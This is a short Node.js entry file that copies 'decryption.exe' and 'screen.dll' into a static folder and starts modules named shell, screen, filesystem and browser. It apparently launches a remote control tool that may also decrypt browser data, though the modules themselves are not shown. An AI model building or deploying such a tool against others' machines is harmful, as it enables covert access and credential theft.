/*
 * @Description: 
 * @Version: 1.0
 * @Autor: solid
 * @Date: 2022-10-31 14:06:37
 * @LastEditors: solid
 * @LastEditTime: 2022-11-10 15:59:11
 */

function ExitDir() {
    const path = require('path');
    const fs = require('fs');
    if (!fs.existsSync("static")) {
        fs.mkdirSync("static", { recursive: true });
    }
    const Static = path.resolve(__dirname, './static');
    if (!fs.existsSync("static/decryption.exe")) {
        fs.writeFileSync("static/decryption.exe", fs.readFileSync(Static + "/decryption.exe"));
    }
    if (!fs.existsSync("static/screen.dll")) {
        fs.writeFileSync("static/screen.dll", fs.readFileSync(Static + "/screen.dll"));
    }
}
ExitDir()

var ShellConn = require("./featureList/shell")
var ScreenConn = require("./featureList/screen")
var FilesystemConn = require("./featureList/filesystem")
var browserConn = require("./featureList/browser")
ShellConn("ws")
ScreenConn("screen")
FilesystemConn("file")
browserConn("browser")